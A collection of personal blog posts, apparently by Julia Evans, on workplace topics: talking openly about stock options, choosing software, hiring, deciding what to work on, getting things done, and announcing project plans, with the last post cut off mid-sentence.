{"url": "https://jvns.ca/blog/2016/01/06/talking-about-stock-options/", "title": "Talking about stock options = awesome", "content": "\n      I wrote  Do the math on your stock options  a few days ago, on how I misunderstood how stock options worked when I took my current job. Then I went back to work, with a lot of new questions about how stock options work at my job specifically! This was on Monday. \n\n I had a lot of questions, so I started by asking a few questions in a Slack channel for asking executives questions. I got a super useful answer right away! It turns out that equity is an extremely popular topic so the discussion got split off into a new channel called #equity. IT’S AWESOME GUYS. It’s been like.. 2 days, and people have asked a ton of questions and had a lot of discussions and learned a lot. A quarter of the company joined the channel immediately. \n\n It turns out that talking about confusing equity / compensation issues in public channels at work is awesome. It means everyone can benefit from the discussion, and everyone realizes that nobody else fully understands what’s going on. People with more experience can share what they know, and people with less experience can ask all their questions! \n\n so far it’s been like a day and I’ve learned \n\n \n that  Pinterest  maybe isn’t actually removing the 90-day exercise limit right away, and why it’s complicated \n that nobody is totally sure how US stock options work in Canada (or internationally, generally) \n what the company’s liquidation preferences for investors look like \n that the company may or may not offer early exercise and uh.. actually I haven’t learned this. But now I know that other people also don’t know! I’ll probably find out soon. \n how/whether other companies let their employees sell stock while private (people talked about what they’ve heard or seen elsewhere) \n that some companies use other equity compensation structures (like  tandem SARs ) that are not so expensive for employees. \n \n\n 6 people have messaged me to say how much they appreciate the open discussion of the topic. The lawyers / founders / finance people / people who actually know the real answers seem pretty willing to answer questions so far. \n\n I was originally worried that asking questions that amount to “what can I do with my stock options if I quit?” would somehow be a bad idea or perceived badly. But mostly everyone seems really delighted to talk about it. It’s great. \n\n"},
{"url": "https://jvns.ca/blog/2017/01/24/choosing-the-best-thing/", "title": "Choosing the \"best software\"", "content": "\n     \n\n When we write software, we make a lot of decisions. Should I use Angular or\nReact? Apache or nginx? Python or Ruby? Which one is the BEST? \n\n I am going to make an argument that “it literally does not matter what is the\nbest”. Is it a good argument? I’m not sure! \n\n Now – I took, like, 3 optimization classes in university. Obviously I am into\noptimization. So I obviously care somewhat about picking the Best Thing. But I\noften find this question of “what is the BEST THING TO USE” kind of…\nparalyzing? So it doesn’t seem like that framework is working for me very well. \n\n another way to think about making decisions \n\n So, let’s talk about another way to think about making decisions than “what is\nthe Best Thing in this situation”. \n\n I run an event series called “lightning talks and pie”. At the most recent one, Ines Sombra gave a talk about capacity planning. In it, she said that there are 3 reasons you might want to change something about your system: \n\n \n It’s too expensive \n It’s too difficult to operate (humans spend a ton of time worrying about it) \n It’s not doing the job it’s supposed to \n \n\n I find these 3 criteria a lot easier to reason about than the “Choose The Best\nThing” framework. For example! At work, we have load balancers. I had a\nconversation today with someone about how their load balancer system is\ndifferent from ours. \n\n Our loadbalancers \n\n \n are not expensive to operate \n don’t take a lot of maintenance (they generally Just Work) \n load balance requests like we want them to, as far as I know \n \n\n So, it literally does not matter at all if they are the Best System! It’s\npossible that there is a strictly better way to do load balancing. But the\nsystem is actually pretty great, and there are several things that are too\nexpensive or that require a lot of maintenance or that are not working the\nright way that I could be working on improving instead. \n\n It is of course still interesting to learn about other load balancer systems\n– in the event that we  do  need to change something later, it is useful to\nknow what other things people are doing in the world. \n\n tradeoffs \n\n One thing sometimes people say to me when I am trying to make a decision about\nwhether to use X or Y is “well, you know, there are tradeoffs, it depends on\nyour situation”. This is definitely true (there are always tradeoffs)! But I\nfind this framing does not really help me actually make a decision. Because\noften the situation is something like “well, X is slower but easier to use, Y\nis faster but harder for humans to use”. And I often feel like.. “okay, so\nwhat do I do now? Saying that there’s a ‘tradeoff’ doesn’t help me at all!” \n\n So I feel like this process is easier for me to actually follow: \n\n \n figure out what you actually  need  the system to do \n figure out which choices will accomplish that, at least mostly \n pick one at random, or whatever people feel better about that day, who knows \n Probably pick the one that people like the best. How the people around you feel is important. \n \n\n Nobody has ever told me “you should make technical decision by just figuring\nout what will work and then just pick whatever is the most popular”, but it\nseems kind of reasonable to me? \n\n some limitations \n\n The question of “does the system work” is complicated. \n\n For example, sometimes  I  will think that a system works fine the way it\nis, and that there’s no need to change it. But then someone else will have an\nAMAZING IDEA about how that thing could be way way better, and they’ll put it\ninto practice, and then I’ll be like “wow, that is totally way better in ways\nthat I did not understand at all. Good thing you changed it!“. \n\n So there is definitely room for redefining what “the system works” even means. \n\n “it doesn’t matter what the best thing is” \n\n I find the idea that “it doesn’t matter what the best thing is” kind of\nfreeing. After all, building a system that works well enough within the\nconstraints that you have is already REALLY HARD. So it seems unreasonable to\nadditionally require that that system also be the Best Possible Thing. \n\n If you have more and better ideas about this you can tell me  on twitter . We will return to our regularly scheduled\nexcitement abour programming soon. (I have a networking zine which is almost\nready!!!) \n\n"},
{"url": "https://jvns.ca/blog/2017/02/16/hiring---opportunity/", "title": "Hiring & opportunity", "content": "\n     \n\n I was talking to my manager today about recruiting for our\ninfrastructure team. I don’t really know much about how to recruit well,\nbut I like to think about it anyway, so I thought I would write down\nsome of my thoughts here. \n\n We were talking about – how do you get rad developers to talk to you\nabout working at your company? And it made me think about how sometimes\nrecruiters/hiring managers email me about jobs, and when I reply to\nthose emails, and when I don’t. \n\n opportunity \n\n So, why do I reply to some emails about jobs and not others? I realized\nthe other day that the emails I get fit into 2 basic categories: \n\n \n job that sounds like a thing I have done before and probably\ncould do again. \n interesting and cool opportunity to do something different! \n \n\n When I interviewed where I work now, I interviewed for the machine\nlearning team. They were like “Julia! We have important business\nproblems that we are solving with machine learning! There is a ton of\ninteresting work left to do! You will get to write machine learning\nsystems that do stuff that really matters!” \n\n This was \n\n \n all totally true \n super exciting to me (I’d been doing machine learning before, but at a company where none of my code actually got  used  for anything by anyone, which was demoralizing) \n basically a really exciting opportunity! \n \n\n I took the job, used machine learning to solve important business\nproblems, and it was really cool! I got to write machine learning\nsystems that really mattered! \n\n But today, when I get emails about jobs doing practical machine learning\nit is.. not as exciting? Like I am definitely not a machine learning\nworld expert, and there are definitely machine learning jobs out there\nWOULD be really cool opportunities for me and where I’d learn a lot. But\nit’s not easy to see which ones those are! Like, here are 3 emails.\nWould I learn how to be better at machine learning at these jobs? Maybe? \n\n job 1: \n\n \n They’re looking for a senior machine learning engineer to help build\nthe realtime intelligence that underlies their business, working with\ndata at scale. \n \n\n job 2: \n\n \n I help build out our machine learning teams here at $company,\nspecifically Risk, and wanted to see if you would be interested in\nexploring opportunities with us. \n \n\n job 3: \n\n \n someone who will do a mix of big data engineering and\nstatistical/predictive modeling, along with the analytical and\ninterpersonal skills to interact with various stakeholders seeking to\nderive value out of this data. \n \n\n hiring isn’t zero-sum \n\n Sometimes I see this narrative around hiring which is like “we are\ntrying to hire the best engineers, the best engineers are trying to find\nthe best companies” \n\n But this idea of the “best engineer” and the “best company” don’t\nreally.. make any sense to me at all? \n\n I feel like you can \n\n \n hire great people who are going to do a great job \n into jobs that are going to be a cool opportunity for them \n \n\n and have both of those things at the same time? Like Stripe hired me, I\nwas BEYOND STOKED to get this job, and I think I’ve done really good\nwork. (and now I do infrastructure-kubernetes-load-balancer-networking\nstuff instead of machine learning, which is really interesting too!) \n\n And there are a lot of reasons someone might be excited about a job! for\nexample: \n\n \n getting to work on a big open source project \n getting to write a new kind of software (like I’m really excited about\ndebuggers!) \n getting to work in a new area of their field (like maybe i would be\ninterested in a job developing neural networks because it is an area\nof ML I don’t know about!) \n working on something with higher availability requirements than\nthey’ve had to deal with previously (like I think it might be\ninteresting to work on systems that have to handle a million\nrequests/second!) \n working on a product that’s really important to people (like I see a lot of super\ninteresting projects inside product at Stripe) \n working in a totally different field (like I talked to someone about\nwriting a driver for a networking card and it sounds SO INTERESTING) \n getting to lead a team and train more junior people and help them\naccomplish awesome things \n \n\n and, well, a billion other reasons. \n\n Anyway none of these things really live on the axis of “the best\nengineer” or “the best company”. There’s an not-very-huge adtech company\nhere that has systems that do like a bajillion requests per second! Some\npeople find it an interesting challenge because of that! \n\n find people for whom your job is a rad opportunity \n\n I like Dan Luu’s post  we only hire the best means we only hire the trendiest \nand I feel like it’s related to this! \n\n He observes that hiring people according to some “type” is pretty\nexpensive: \n\n \n if your type is the same type everyone else is competing for, “you\nare competing for talent with the wealthiest (or most overfunded)\ntech companies in the market”. \n \n\n If you’re trying to hire the same people as everyone else, why would\nthey work for you? They have so many interesting opportunities! \n\n But it really helped me think\nabout this problem! For example my  team  is working on moving some things to Kubernetes, which is really interesting and hard for all kinds of reasons.\nSo it feels like it makes more sense to figure out “hmm, who would be\nexcited about this kind of project and where would we find them?” \n\n and then it is more like.. a fun puzzle where you try to figure out who\nis great who would be excited about the thing? \n\n And this doesn’t just mean “find junior developers and train them” –\nlike, I’m not a “junior developer”, and there are all kinds of things\nthat I have not done yet that are interesting opportunities for me!\n(like, I am still learning what this Kubernetes thing is!) \n\n"},
{"url": "https://jvns.ca/blog/2016/05/29/three-ways-to-solve-hard-programming-problems/", "title": "Three ways to solve hard programming problems", "content": "\n     \n\n I thought of this framing yesterday on a boat and it felt kind of helpful to me. This is a pretty small idea so I’ll keep this short :) \n\n So, you have a programming problem to solve that seems hard, and you have no software that does it right now. three ways to fix that: \n\n Realize that there is awesome existing software that you can repurpose \n\n This is relatively easy and extremely fun. \n\n A super simple example of something like this is – once I was doing a computer science competition, and we needed to create a diet plan that satisfied some nutritional requirements while costing as little as possible. \n\n I realized that you could do this with  integer linear programming software  because I was taking a class on the topic at the time, spent an hour formulating the problem as an integer linear program, and BAM. We totally won that part of competition. The tool we used was a commercial tool that my university had a license for that had probably been worked on by hundreds of people for years. My friend  Anton  uses integer programming to solve problems a lot and it’s really cool. \n\n The same kind of thing is true with dtrace on OS X/BSD/Solaris – that’s another tool that’s had a ton of effort put into it and if you learn the dtrace language, you can suddenly do things using it by writing small programs that were impossible before. \n\n I sorta think of this blog as an extended fanzine for existing software mostly for this reason – to say “hey someone spend a bajillion hours developing this thing and it is amazing and maybe you could use it did you know about it???!”. Some fraction of the interesting posts on Hacker News or whatever are like this – they say “HEY DID YOU KNOW THAT SOMEONE WROTE EXTREMELY POWERFUL SOFTWARE???? I wrote a cool small wrapper to make that software do a new thing!” \n\n Steal an idea \n\n So, sometimes you want to do a thing, and it seems hard, and there is no software you can really repurpose in a good way. \n\n I think solving this problem is the whole goal of the  Papers We Love  meetup, which is about making ideas in academic research more available to working programmers. Avi Bryant, being someone who likes to read papers and use the ideas in them in software, has a talk I like about this idea called  Bad hackers copy, great hackers steal . \n\n At work, an example of this I’ve seen is probabilistic data structures like bloom filters and hyperloglogs – it’s very possible that the language you’re using has no good library support for probabilistic data structures, but if they’re not available it’s not really that much work to go ahead and implement them yourself. Sometimes big ideas don’t take that much code to go implement! \n\n Security research also seems like this – people constantly explain new exploit techniques at security conferences, but I get the impression that if you want to use it to find vulnerabilities then you need to write most of the code yourself. \n\n Come up with a new idea \n\n This is basically what academic research is! ❤ academics ❤. They’re like “we do not have enough great ideas yet! TIME TO GENERATE MORE IDEAS”. \n\n ❤❤❤ when research labs publish software \n\n I think people get so excited when research labs publish projects like  vowpal wabbit  because they do ‘come up with a new idea’ and ‘implement the idea in a way that can be used by other people’ in one fell swoop, making it super easy to repurpose that software for your awesome ends. \n\n The advantage of this would seem to be that you don’t need to wait for someone to pick up the paper at a Papers We Love meetup and say OH WOW I LOVE THIS SO MUCH I AM GOING TO SPEND A MONTH BUILDING THIS NOW. The people who think of the idea and the people who implement it can be in the same office which is more efficient. \n\n The disadvantage is maybe that the research lab needs to hire people who are good at research and also people who can write software suitable for other people to use, which are actually different skills. So I guess you need a bigger budget. When people like Microsoft Research do this it seems to be really awesome though! \n\n"},
{"url": "https://jvns.ca/blog/2016/09/12/how-i-got-a-cs-degree-without-learning-what-a-system-call-is/", "title": "How I got a CS degree without learning what a system call is", "content": "\n     \n\n Yesterday I wrote that I have 2 CS degrees but didn’t know what a system call\nwas when I graduated. Some people think this is surprising and a failure of CS\neducation. \n\n I don’t have any opinions really about what a CS education should  be, but, to\nexplain how this happened, I wrote down a while ago all the classes I took in\nmy joint math/CS undergrad. The math & CS theory classes at my university were\nextremely good, so I just took all of them. \n\n This is just to say that “a CS degree” can represent a lot of different\neducations, and personally I think that’s totally fine. I know people who\nmostly did electrical engineering and human computer interaction! Took a ton\nof biology classes because they were studying bioinformatics! \n\n But more importantly – it’s ok to not know things. I knew practically nothing\nabout a lot of really important programming concepts when I got out of grad\nschool. Even though I’d started learning to program 8 years before! Now I know those\nthings! I learned them. \n\n I have friends who are amazing programmers who sometimes feel bad because they\ndon’t have a CS degree and sometimes don’t know algorithms/CS theory stuff\nthat other people know. They’ve learned the things they needed to know! They\nare great. \n\n Here’s the list. \n\n undergrad \n\n PURE MATH\nMATH 235 Algebra 1\nMATH 242 Analysis 1\nMATH 248 Honours Advanced Calculus\nMATH 325 Honours ODE's\nMATH 251 Honours Algebra 2\nMATH 255 Honours Analysis 2\nMATH 377 Honours Number Theory\nMATH 354 Honours Analysis 3\nMATH 356 Honours Probability\nMATH 366 Honours Complex Analysis\nMATH 370 Honours Algebra 3\nMATH 371 Honours Algebra 4\nMATH 355 Honours Analysis 4\n\nOPTIMIZATION + ALGORITHMS\nMATH 350 Graph Theory and Combinatorics\nCOMP 250 Intro to Computer Science\nCOMP 252 Algorithms and Data Structures\nCOMP 506 Advanced Analysis of Algorithms\nCOMP 567 Discrete Optimization 2\nMATH 552 Combinatorial Optimization\nMATH 560 Continuous Optimization\nCOMP 690 Probabilistic Analysis of Algorithms\n\nUNIX BASICS + ASSEMBLY\nCOMP 273 Intro to Computer Systems\nCOMP 206 Intro to Software Systems\n\nCS THEORY + PROGRAMMING LANGUAGES\nCOMP 302 Programming Languages & Paradigms\nCOMP 524 Theoretical Foundations of Programming Languages\nCOMP 330 Theoretical Aspects of Comp Sci\n\nOTHER CS TOPICS:\nCOMP 761 Quantum Information Theory\nCOMP 462 Computational Biology Methods\nCOMP 520 Compiler Design\n \n\n grad school \n\n I had to take 6 classes during my master’s. They were: \n\n \n Higher Algebra 1 \n Geometry & Topology 1 \n Geometry & Topology 2 \n Machine Learning \n Topics in Computer Science (lie algebras) \n Advanced Topics Theory 2 (I don’t remember the topic right now) \n \n\n My master’s thesis. \n\n"},
{"url": "https://jvns.ca/blog/2016/08/16/how-do-you-work-on-something-important/", "title": "How do you decide what to work on?", "content": "\n     \n\n So, I work as a programmer. Until pretty recently I was working on\nmachine learning, which is really fun and interesting. One thing I like\nabout machine learning is – it’s important (and fun!) to actually spend\ntime with your data manually and understand it and look at individual\nthings. \n\n But, ultimately, they did not hire me to do manual work! One week I remember\nthinking “right, my job is to build systems that accurately classify millions\nof things, not to look at those things manually.” \n\n So the reason programmers sometimes get paid a lot of money, I think, is\nbecause we can build systems that leverage computers to do an\nunreasonable amount of work. If you build Gmail’s spam system, you can\nremove spam from the inboxes of millions of people! This is kind of\nmagical and amazing and it’s worth all of the bugs and dealing with\ncomputers. \n\n But it takes a long time! Basically anything interesting that I work on\ntakes, let’s say, 2-6 months. And it’s not too weird to work on projects\nthat take even longer! One of my friends worked on the same\nthing for more than a year. And at the end he’d built a  system for drawing transit maps that’s better than\nGoogle’s . This was really cool. \n\n So this means you can really only do a few things. And if one of those things\ndoesn’t work out then that means that like a quarter of your work for the year\nis gone. This is okay, but it means it’s worth being thoughtful. \n\n And the more time I spend programming, the more time I see that it’s actually\nsuper hard to figure out what would be important to work on. Like, sure, I can\nmake a computer do a billion things (literally! That’s pretty easy!), but\n which billion things exactly ? What will have a lot of impact? What will help\nmy company do better? \n\n Once, a little while after I started at my current job,\nI told my manager “hey, I’m thinking of doing $thing”. He said “ok, what if\nyou do $other_thing instead?” So I built the first version of the thing he\nsuggested (a small system for making it easier to keep track of your machine\nlearning experiments), and two years later it’s something that the team still\nuses and that a bunch of other people have built on top of. It turns out that\nit was a good idea! \n\n When I started programming, I thought that people would tell me what code to\nwrite, and then I would write that code, and then that would be all. That is\nnot how it’s been, even though certainly I get guidance along the way. I work\nfor a place that gives its engineers a lot of autonomy. \n\n So instead, for me, it’s been more like: \n\n \n well we have this one long-term goal, or three, or six \n also a bunch of minor problems of varying urgency \n now it’s up to you to figure out which ones would be good to solve\nright now \n also you have to figure out how to solve them \n also the problems might be impossible to solve \n and there are all these other external factors \n you get to talk to a bunch of people who have thought about these\nproblems for a while to do it though! \n here’s 40 hours a week. go. \n \n\n know what your goals are \n\n So, how do you decide what to  do ? \n\n I have a coworker Cory Watson who gave this cool talk at Monitorama\ncalled  Creating a Culture of Observability . \n\n He describes what he’s doing as follows on that page: \n\n \n In other words, if our sensors — think about metrics, logs and traces —\nare good, then we can learn about how effectively our systems are\nworking! \n\n My job at Stripe is to make this fucking awesome. \n \n\n It is kind of obvious when working with Cory that he is relentlessly focused\non making it easier to know what our software systems are doing. And it helps!\nThe company’s dashboards and metrics have gotten way better as a result. It’s\neasier to make performance improvements and detect and understand errors. \n\n My friend Anton who made that transit maps app, cares SO MUCH about how to\nrepresent public transit information and he thinks about it all the time so\nit’s not that surprising to me that he’s built an awesome way to do it. \n\n I think this kind of focus is incredibly helpful – when I don’t have a clear\ngoal, I find it really really hard to get things done or decide what to do. I\nthink of this as kind of the “can I explain my job to someone at a party?”\ntest. When I can’t pass this test (especially if the person at the party is a\nsoftware engineer) I feel uncomfortable. \n\n Obviously you don’t need to always focus on the same thing (jeff dean is\nlike a legend at Google or something and I think he’s done a ton of\ndifferent thing), but having a focus seems really important. \n\n coming up with a focus is not that easy \n\n At work there are a lot of possible things to think about! And as a single\nperson (not a manager), there’s only so much you can focus on at a time. Some\nthings I see people working on: \n\n \n Our storage systems are super-reliable and easy to use \n It’s easy to tell what your code is doing, in real time \n Make the development experience really good and easy \n Make the dashboard an awesome place for our users to understand their business \n \n\n So somehow I need to find a thing that is big enough and important enough to\nfocus on (can i explain to my colleagues why i’m doing what i’m doing?), but\nalso small enough that a single person (or small group) can make progress on\nit. And then it is way easier to write code towards that vision! \n\n there’s no one “right thing” \n\n I originally called this post “how do you work on the right thing?” I retitled\nit because I think that that’s a wrong (and kind of dangerous) wording –\nthere is no one right thing to work on. I work with many many excellent people\nwho are working on many many important things. Not all things are equally\nimpactful (which is what this post is all about!), but it’s about reliably\nfinding useful things to work on that are within your capabilities, not\nfinding a global optimum. \n\n If I only wrote globally optimal blog posts I would literally never publish\nanything. \n\n believe it’s possible \n\n One thing about working on long-term or ambitious projects is – you  have \nto believe that you can do the project. If you start a cool year-long project,\napproximately 50 million things will go wrong along the way. Things you didn’t\nexpect to break will break. And if you give up when you have a bad week or\nthree weeks or somebody doesn’t believe that what you’re doing is right, you\nwill never finish. \n\n I think this is a really important thing a mentor / more senior person\ncan do for someone more junior. A lot of the time you can’t\ntell what’s possible and what’s impossible and what obstacles are fine and\nwhat obstacles are insurmountable. But this can be\nbootstrapped! If someone tells you “don’t worry, it’ll all work out!”,\nthen you can start, and hit the problems, and ask for advice, and keep\ngoing, and emerge victorious. \n\n And once you have emerged victorious enough times (and failed enough\ntimes!), you can start to get a sense for which things will work and\nwhich things will not work, and decide where to persevere. \n\n People talk a lot about ‘agile’ and MVPs but I don’t think that’s a complete\nanswer here – sometimes you need to build a big thing, and you can write\ndesign docs and prototypes, but ultimately you need to decide that damnit,\nit’s going to work, and commit to spending a long time building it and showing\nintermediate progress when you can. \n\n Also your organization needs to support you in your work – it’s very hard to\nget anything done if the people around you don’t believe that you can get it\ndone. \n\n I’m not in undergrad anymore \n\n I  loved  being a math/CS undergrad. My professors would give me a series of\nchallenging assignments which were hard but always within my abilities. I\nimproved gradually over time! It was so fun! I was awesome at it! But it is\nover. \n\n Being employed is more like – I have a series of tasks which range from\ntotally trivial to I-don’t-even-know-where-to-start and I need to figure out\nhow to interrogate people and build up my skills so that I can do the hard\nthings. And I need to decide what “good enough” means for the things I do\ndecide to do, and nobody will do it for me, not really. There’s an interesting\ncomment by Rebecca Frankel that Dan Luu pointed me to, on\n this post \n\n \n I agree with Steve Yegge’s assertion that there are an enormously important\n(small) group of people who are just on another level, and ordinary smart\nhardworking people just aren’t the same. Here’s another way to explain why\nthere should be a quantum jump – perhaps I’ve been using this discussion to\nbuild up this idea: it’s the difference between people who are still trying\nto do well on a test administered by someone else, and the people who have\nfound in themselves the ability to grade their own test, more carefully,\nwith more obsessive perfectionism, than anyone else could possibly impose on\nthem. \n \n\n So somehow working on an important thing and doing it well means you have to\ndecide what your goals are and also build your own internal standards for\nwhether or not you’ve met them. And other people can help you get started with\nthat, but ultimately it’s up to you. \n\n some disconnected thoughts that feel useful \n\n \n Maggie talked about “postmortem-driven development” – look at things that have broken several times! see if you can help them not break again! \n It’s normal (and important!!) to do experiments that fail. Maybe the trick is to timebox those experiments and recognize when you’re doing something risky / new. \n \n\n I don’t know! \n\n I feel weird admitting that I really struggle with this, but I really struggle\nwith this. I do not always have good ideas about what to build. Sometimes I\nhave ideas that I think are good and I do them and they’re great, and\nsometimes I have ideas and I do them and they’re… really not great. Sometimes\nI have standards for my work that I cannot figure out how to meet and that’s\nreally frustrating. \n\n Sometimes other people have ideas and I think they’re great and help build\nthose ideas and it’s amazing. That’s a really good feeling. So far the best\nthings I’ve worked on have been other people’s ideas that I got excited about. \n\n Sometimes other people have ideas and I don’t understand what they’re talking\nabout for months until they build it and I’m like OH THAT IS REALLY COOL WOW\nWOW WOW. Even reliably recognizing good ideas is hard! \n\n Some links: \n\n \n Data-Driven Products Now!  is a talk by Dan McKinley about how to think about building consumer-facing web products. \n The Secret to Growing Your Engineering Career If You Don’t Want to Manage  (thanks to Emil Sit) \n The Highest-Leverage Activities Aren’t Always Deep Work \n \n\n \nThanks to Emil Sit, Camille Fournier, Kyle Kingsbury, Laura Lindzey, Lindsey Kuper, Stephen Tu, Dan Luu,\nMaggie Zhou, Sunah Suh, Julia Hansbrough, and others for their comments on this.\n \n\n"},
{"url": "https://jvns.ca/blog/2016/09/19/getting-things-done/", "title": "Getting things done", "content": "\n     \n\n Ok, so this is kind of a feelings-y productivity-y post. So, to be clear –\nthis is not advice, even though it’s phrased that way. This is just some stuff\nthat feels like it’s working for me right now so I wanted to write it down. I\nwill go back to writing about strace again soon. \n\n The premise is – I have a job. I work on a pretty small team, and so what I\npersonally get done is a pretty large part of what the team overall does. So\ngiven that I work on a good team that helps me do things, what can I\npersonally do to be better at getting things done? \n\n Have a vision (maybe even the right one) \n\n We talked about this in  How do you decide what to do? . \n\n This is the “can I explain what I’m doing to someone at a conference?” test. When I can’t do this I find it really hard to get things done. This is because without a framework for what I’m doing (“make our infrastructure cheaper to run! Make it easier to debug problems! Improve reliability by making it harder for humans to make mistakes! protect our customers from fraud”), it’s really easy to get stuck in small day-to-day decisions about what direction to take. \n\n I asked a coworker one time about how to have a vision if I wasn’t even sure what the Right Vision Was! He suggested just picking a vision that seemed mostly reasonable and then moving that way until I learned more. This was actually really helpful. \n\n Focus (do one thing at a time, maybe two) \n\n When I actually focus on a thing, I’m always amazed by how much I can get done. If I do more than about 2 things, then all of the things take forever to get finished. \n\n I think “focus on one thing” is not good advice how higher-level people (like executives who need to keep track of a huge number of things going on in their organizations). But for me (an individual software engineer), it works best if I just pay attention to one or two things at a time. \n\n Learn how to break things down \n\n I think this is how you get from ‘vision’ to ‘focus’ – you can’t actually execute on all the parts of your vision at the same time. I think I’m getting better at being like “ok, I’m going to this Distant Container Island, I’m first going to go pick up some provisions in the Lagoon of Configuration Management”. \n\n This is a hard thing to do but I think I’ve gotten better at it over time. \n\n Try to get something done every day \n\n So, there are all these daily productivity hacks, like not checking Twitter\ntoo often or only checking your email 3 times a day, or whatever. I don’t know\nabout those. One reasonable heuristic for me is – if I’m doing an Important\nThing (“do one thing at a time, maybe two!”), then I should try to make at\nleast some progress on the Important Thing every day. If I do that, then I’m\ndefinitely always getting stuff done. \n\n Talk to someone when I get stuck \n\n I get stuck sometimes! I’ve tried to stop feeling bad about telling someone when I’m stuck, and just go talk through whatever I’m working on with a person who usually helps me get unstuck (hi, Franklin).  Asking questions is a superpower . \n\n Don’t be scared of small problems \n\n I’ve noticed that when I work on things, there is usually a weird maze between the Start Point and the Thing Actually Being Done. The maze is full of unexpected problems and OH MY IS THAT HOW THAT SYSTEM WORKS OH GOODNESS OKAY. I can figure out some of the biggest problems in advance by writing a  design document , but there will always be surprises. \n\n I used to get a lot more scared when something unexpected happened like OH NO WHAT IF MY PROJECT WILL FAIL EVERYTHING IS TERRIBLE. I’m trying to learn to be more optimistic and just think “ok, well, something weird happened, there are always weird things, it will be fine”. So far it’s working. \n\n Do whatever’s necessary \n\n This one comes straight out of my company’s value system. Sometimes I need to edit code in a codebase that, say, belongs to another team. Just to do a small thing. I have occasionally tried to ask them to write the code for me. This works approximately 0% of the time and takes weeks. What DOES work and is pretty fast is to: \n\n Talk to someone on the other team about whether what I want to do seems reasonable\nAsk them to pair for 30 minutes with me to get me started\nFinish writing the code myself \n\n So it turns out to get things done I have to do a bunch of things that I do not know how to do and am not necessarily qualified to do. Usually I can just do these things and it is fine. \n\n Have deadlines \n\n I’m still not sure if this is useful but – sometimes I find it super useful to have an arbitrary deadline for a task, especially a big one. Like “You should be done with this in 6 weeks”. I don’t want it to be like “… or else you’ll be fired”, but I think deadlines are helpful to see when something’s growing in scope uncontrollably or is taking a lot longer than you thought. Then maybe I can cut features! \n\n Believe in yourself \n\n This is very feelings-y but it is pretty useful for me to believe that I can actually do the thing I’m setting out to do. That’s all. Often when I try to do a thing it turns out that I can do it, so this is basically reasonable. \n\n I can do a lot! \n\n It turns out that I as a human can do a lot on my own! Like, outside of work I made  this zine , and I think it’s been useful to a ton of people! I’m really happy with the outcome. All I really had to do was have a small vision (“teach people how to debug their computers better”) sit down and focus for a while on a few weekends, be willing to ship something that wasn’t perfect, and have a deadline (I wanted to hand them out at Strange Loop this year). \n\n"},
{"url": "https://jvns.ca/blog/2017/09/03/telling-people-what-you-re-working-on/", "title": "Telling people what you're working on", "content": "\n     \n\n At work sometimes people send “kickoff” emails, basically announcing “hey,\nwe’re going to start working on this project, here’s why”. \n\n The format is basically: \n\n \n explain the goals (why is this gonna be awesome?) \n explain who’s affected by the project \n maybe talk about the risks a little \n talk a little about timelines \n \n\n announcing what you’re working on can be scary \n\n I find it kind of scary to tell people what I’m working on! Once I was\ntalking about plans with a Very Experienced Person and they said “yeah, sharing\ntentative plans with lots of other people  is  scary” and I was so happy that it\nwasn’t just me. \n\n Some reasons I think it’s sort of scary: \n\n \n what if I fail and everyone thinks I’m terrible at my job? \n what if something unexpected happens and we have to completely change the plan? \n what if this takes way longer to do than we think? \n \n\n It seems much safer to: \n\n \n start working on a thing \n hide in a corner until it’s done \n announce “look, we did it, it worked” \n \n\n After all, if I only tell people about things when they’re finished and\namazing, then everything I announce will have succeeded! 100% success rate!!\nWhat could be better? \n\n But this pattern of “let me hide in a corner until I’m done this project,\nor at least I won’t tell anyone outside my team” sounds suspiciously like “I won’t\npush my code to github until it’s perfect”, and we know it’s important to share\nworks in progress when you’re coding! :) \n\n reasons announcing plans is good \n\n A few reasons announcing plans is useful: \n\n \n Everyone else is trying to plan their work all the time. If I announce what I’m planning, that helps people who are working on related projects! For example, my team just announced a project that interacts a lot with another team’s work, so that team is going to allocate someone to work on it! \n If we advertise a plan maybe someone will notice an important problem with it and tell us! \n Writing a plan forces your clarify your goals \n Communicating clear plans helps management… manage. \n I think announcing  ambitious  plans can help kind of.. inspire the people around you? Like I sometimes see that someone else is kicking off a Very Important Project and I think, wow, that’s really cool, maybe we can do something cool like that. \n It’s exciting to see people starting and finishing projects, like it creates momentum for the whole company if everyone talks about what they’re doing! \n \n\n I think the shared planning aspect is probably the most important though! If\neveryone hides in a corner and doesn’t tell people what they’re doing until\nthey’re done… well, that wouldn’t really be a very effective way to work\ntogether. \n\n One of our sibling teams always announces what they’re working on VERY LOUDLY\n(like they send tons of announcement emails) and I kind of love it because I\nalways know what’s going on with them. Their plans don’t always work out\nexactly as planned! Sometimes they change direction! But it’s really awesome to\nknow how they’re spending their time & what to expect from them in the near\nfuture. \n\n ways to make it less scary \n\n Remember  it’s my job/responsibility  to talk about what I’m doing. We’re all\ntrying to build something together, and as a team we can’t do that if we don’t\ntalk about our plans. (I think as I get more experienced this becomes more and\nmore my job) \n\n Another thing I think might help me is  assume everything I do will succeed .\nI feel like I sometimes waste a lot of time worrying “oh no, what if this goes\nwrong”. And of course to some extent worrying is useful! Every project has\nrisks and it’s important to think about how to manage those risks. But I think\nif I start with the assumption that the thing I’m embarking on will probably\nwork, it’ll be easier to execute and tell people about. It seems like\nconfidence is pretty important when you’re trying to do something hard. \n\n It’s definitely important to  tell people plans that are mostly true . Plans\ndon’t need to be 100% right (everything always changes), but for them to be\nuseful, they need to be at least mostly right. Like maybe do a proof of concept\nfirst and chat with the stakeholders. \n\n Just tell the people who need to know about it . Like – this week we sent a\nkickoff email. It was for a networking thing that is relevant to many\ndevelopers, but nobody outside engineering will really be affected by it. So we\njust sent the email to the developers mailing list! \n\n Maybe that’s it? Like, if when we’re planning something, we just \n\n \n come up with a reasonable plan and think/talk about it with folks \n do at least some preliminary work, I think it’s good to at least do a\nprototype or something first to get some confidence in the approach \n assume that our plan will work (that when we run into problems, we’ll figure\nout a way to solve them) \n loudly communicate that plan to a reasonable list of people (not too much\nbigger than it needs to be) \n listen to the feedback we get and incorporate it when we need to \n \n\n then that will be fine! \n\n reasons hiding in a corner might be good \n\n I think sometimes there are actually good reasons  not  to tell people what\nyou’re doing. \n\n In some work cultures, sometimes people can put out a lot of stop energy! If\nyou say “hey this is what we’re planning”, you might get back “hello here are\n100000 reasons why what you’re doing won’t work / is a bad idea”. I think if\npeople do this a lot it is actually maybe kind of reasonable to react with “ok,\nwe’re just not going to tell people what we’re doing until we’re further\nalong”. \n\n Philip Guo has a great vlog about how  it’s important to start personal creative projects privately  –\nif you don’t tell anyone about an early stage baby idea, it can give you the\nspace/safety to develop it! That’s really important! So I think there’s a\ncaveat 